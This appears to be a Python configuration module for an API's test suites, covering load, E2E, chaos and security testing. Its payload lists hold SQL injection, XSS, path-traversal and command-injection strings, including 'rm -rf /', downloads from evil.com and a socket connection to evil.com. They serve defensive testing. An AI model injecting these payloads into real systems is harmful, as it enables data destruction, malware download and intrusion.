# Advanced Testing Configuration

"""
Configuration for advanced testing suites
"""

from typing import Dict, Any, List
from dataclasses import dataclass
from enum import Enum

class TestEnvironment(Enum):
    """Test environments"""
    LOCAL = "local"
    STAGING = "staging"
    PRODUCTION = "production"

@dataclass
class LoadTestConfig:
    """Load testing configuration"""
    base_url: str
    users: int
    spawn_rate: int
    duration: str
    scenarios: List[str]
    output_dir: str

@dataclass
class SecurityTestConfig:
    """Security testing configuration"""
    base_url: str
    test_types: List[str]
    payload_files: Dict[str, str]
    output_dir: str

@dataclass
class E2ETestConfig:
    """E2E testing configuration"""
    base_url: str
    browser: str
    headless: bool
    viewports: List[Dict[str, int]]
    output_dir: str

@dataclass
class BenchmarkConfig:
    """Performance benchmarking configuration"""
    base_url: str
    test_duration: int
    concurrent_users: List[int]
    endpoints: List[str]
    output_dir: str

@dataclass
class ChaosConfig:
    """Chaos engineering configuration"""
    base_url: str
    experiments: List[str]
    monitoring_interval: int
    output_dir: str

class AdvancedTestConfig:
    """Main configuration class for advanced testing"""
    
    def __init__(self, environment: TestEnvironment = TestEnvironment.LOCAL):
        self.environment = environment
        self.configs = self._load_configs()
    
    def _load_configs(self) -> Dict[str, Any]:
        """Load configurations based on environment"""
        
        base_configs = {
            TestEnvironment.LOCAL: {
                "base_url": "http://localhost:8000",
                "output_dir": "tests/results",
                "timeout": 30,
                "retries": 3
            },
            TestEnvironment.STAGING: {
                "base_url": "https://staging-api.example.com",
                "output_dir": "tests/results/staging",
                "timeout": 60,
                "retries": 5
            },
            TestEnvironment.PRODUCTION: {
                "base_url": "https://api.example.com",
                "output_dir": "tests/results/production",
                "timeout": 120,
                "retries": 10
            }
        }
        
        base_config = base_configs[self.environment]
        
        return {
            "load_testing": LoadTestConfig(
                base_url=base_config["base_url"],
                users=50,
                spawn_rate=5,
                duration="5m",
                scenarios=["normal", "peak", "stress"],
                output_dir=f"{base_config['output_dir']}/load"
            ),
            "security_testing": SecurityTestConfig(
                base_url=base_config["base_url"],
                test_types=["authentication", "authorization", "sql_injection", "xss"],
                payload_files={
                    "sql_injection": "tests/security/payloads/sql_injection.txt",
                    "xss": "tests/security/payloads/xss.txt"
                },
                output_dir=f"{base_config['output_dir']}/security"
            ),
            "e2e_testing": E2ETestConfig(
                base_url=base_config["base_url"],
                browser="chromium",
                headless=True,
                viewports=[
                    {"width": 1920, "height": 1080},
                    {"width": 1024, "height": 768},
                    {"width": 375, "height": 667}
                ],
                output_dir=f"{base_config['output_dir']}/e2e"
            ),
            "benchmarking": BenchmarkConfig(
                base_url=base_config["base_url"],
                test_duration=60,
                concurrent_users=[1, 5, 10, 25, 50],
                endpoints=["/health", "/api/v1/users/", "/api/v1/products/"],
                output_dir=f"{base_config['output_dir']}/benchmarks"
            ),
            "chaos_engineering": ChaosConfig(
                base_url=base_config["base_url"],
                experiments=["cpu_stress", "memory_stress", "rate_limit_overload"],
                monitoring_interval=5,
                output_dir=f"{base_config['output_dir']}/chaos"
            )
        }
    
    def get_config(self, test_type: str) -> Any:
        """Get configuration for specific test type"""
        return self.configs.get(test_type)
    
    def update_config(self, test_type: str, **kwargs):
        """Update configuration for specific test type"""
        if test_type in self.configs:
            config = self.configs[test_type]
            for key, value in kwargs.items():
                if hasattr(config, key):
                    setattr(config, key, value)
    
    def get_all_configs(self) -> Dict[str, Any]:
        """Get all configurations"""
        return self.configs

# Global configuration instance
config = AdvancedTestConfig()

# Test data and payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "1' OR 1=1 --",
    "admin'--",
    "' OR 1=1 #",
    "1' AND '1'='1",
    "1' OR '1'='1' AND '1'='1",
    "1' OR '1'='1' OR '1'='1",
    "1' OR '1'='1' UNION SELECT 1,2,3--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "';alert('XSS');//",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>"
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "&& cat /etc/passwd",
    "|| id",
    "; rm -rf /",
    "| curl http://evil.com",
    "&& wget http://evil.com/malware",
    "|| nc -l 4444",
    "; python -c 'import os; os.system(\"whoami\")'",
    "| python -c 'import socket; socket.socket().connect((\"evil.com\", 4444))'"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd"
]

# Test scenarios
LOAD_TEST_SCENARIOS = {
    "smoke": {
        "users": 5,
        "spawn_rate": 1,
        "duration": "2m",
        "description": "Smoke test - basic functionality"
    },
    "normal": {
        "users": 50,
        "spawn_rate": 5,
        "duration": "5m",
        "description": "Normal load test - typical usage"
    },
    "peak": {
        "users": 200,
        "spawn_rate": 10,
        "duration": "10m",
        "description": "Peak load test - high traffic"
    },
    "stress": {
        "users": 500,
        "spawn_rate": 20,
        "duration": "15m",
        "description": "Stress test - maximum load"
    },
    "endurance": {
        "users": 100,
        "spawn_rate": 5,
        "duration": "1h",
        "description": "Endurance test - long duration"
    }
}

CHAOS_EXPERIMENTS = {
    "cpu_stress": {
        "type": "cpu_stress",
        "duration": 120,
        "intensity": 0.8,
        "description": "Generate CPU load to test performance under stress"
    },
    "memory_stress": {
        "type": "memory_stress",
        "duration": 90,
        "intensity": 0.7,
        "description": "Generate memory pressure to test memory management"
    },
    "network_latency": {
        "type": "network_latency",
        "duration": 60,
        "intensity": 0.5,
        "description": "Inject network latency to test timeout handling"
    },
    "rate_limit_overload": {
        "type": "rate_limit_overload",
        "duration": 180,
        "intensity": 1.0,
        "description": "Generate excessive requests to test rate limiting"
    },
    "database_connection_loss": {
        "type": "database_connection_loss",
        "duration": 30,
        "intensity": 1.0,
        "description": "Simulate database connection loss"
    }
}

# Performance thresholds
PERFORMANCE_THRESHOLDS = {
    "response_time": {
        "excellent": 0.1,  # 100ms
        "good": 0.5,      # 500ms
        "acceptable": 1.0, # 1s
        "poor": 2.0       # 2s
    },
    "throughput": {
        "excellent": 1000,  # 1000 req/s
        "good": 500,        # 500 req/s
        "acceptable": 100,  # 100 req/s
        "poor": 50          # 50 req/s
    },
    "error_rate": {
        "excellent": 0.1,   # 0.1%
        "good": 1.0,        # 1%
        "acceptable": 5.0,  # 5%
        "poor": 10.0        # 10%
    },
    "cpu_usage": {
        "excellent": 50,    # 50%
        "good": 70,         # 70%
        "acceptable": 85,   # 85%
        "poor": 95          # 95%
    },
    "memory_usage": {
        "excellent": 60,    # 60%
        "good": 75,         # 75%
        "acceptable": 85,   # 85%
        "poor": 95          # 95%
    }
}

# Security test categories
SECURITY_TEST_CATEGORIES = {
    "authentication": {
        "tests": ["bypass", "brute_force", "session_management"],
        "severity": "high"
    },
    "authorization": {
        "tests": ["privilege_escalation", "access_control", "data_access"],
        "severity": "high"
    },
    "input_validation": {
        "tests": ["sql_injection", "xss", "command_injection", "path_traversal"],
        "severity": "critical"
    },
    "infrastructure": {
        "tests": ["ssl_tls", "headers", "cors", "rate_limiting"],
        "severity": "medium"
    },
    "business_logic": {
        "tests": ["workflow_bypass", "data_integrity", "transaction_manipulation"],
        "severity": "high"
    }
}

# E2E test scenarios
E2E_TEST_SCENARIOS = {
    "user_registration": {
        "steps": [
            "Navigate to registration page",
            "Fill registration form",
            "Submit form",
            "Verify success message",
            "Check user in database"
        ],
        "expected_duration": 30
    },
    "user_login": {
        "steps": [
            "Navigate to login page",
            "Enter credentials",
            "Submit form",
            "Verify dashboard access",
            "Check session creation"
        ],
        "expected_duration": 15
    },
    "product_management": {
        "steps": [
            "Login as admin",
            "Navigate to products",
            "Create new product",
            "Edit product",
            "Delete product",
            "Verify changes"
        ],
        "expected_duration": 60
    },
    "whatsapp_integration": {
        "steps": [
            "Send WhatsApp message",
            "Verify message delivery",
            "Check conversation creation",
            "Test message types",
            "Verify webhook handling"
        ],
        "expected_duration": 45
    }
}

def get_performance_rating(metric: str, value: float) -> str:
    """Get performance rating based on thresholds"""
    thresholds = PERFORMANCE_THRESHOLDS.get(metric, {})
    
    if value <= thresholds.get("excellent", float('inf')):
        return "excellent"
    elif value <= thresholds.get("good", float('inf')):
        return "good"
    elif value <= thresholds.get("acceptable", float('inf')):
        return "acceptable"
    else:
        return "poor"

def get_security_severity(test_category: str) -> str:
    """Get security severity for test category"""
    return SECURITY_TEST_CATEGORIES.get(test_category, {}).get("severity", "medium")

def get_test_scenario(scenario_name: str) -> Dict[str, Any]:
    """Get test scenario configuration"""
    return LOAD_TEST_SCENARIOS.get(scenario_name, {})

def get_chaos_experiment(experiment_name: str) -> Dict[str, Any]:
    """Get chaos experiment configuration"""
    return CHAOS_EXPERIMENTS.get(experiment_name, {})

def get_e2e_scenario(scenario_name: str) -> Dict[str, Any]:
    """Get E2E test scenario configuration"""
    return E2E_TEST_SCENARIOS.get(scenario_name, {})
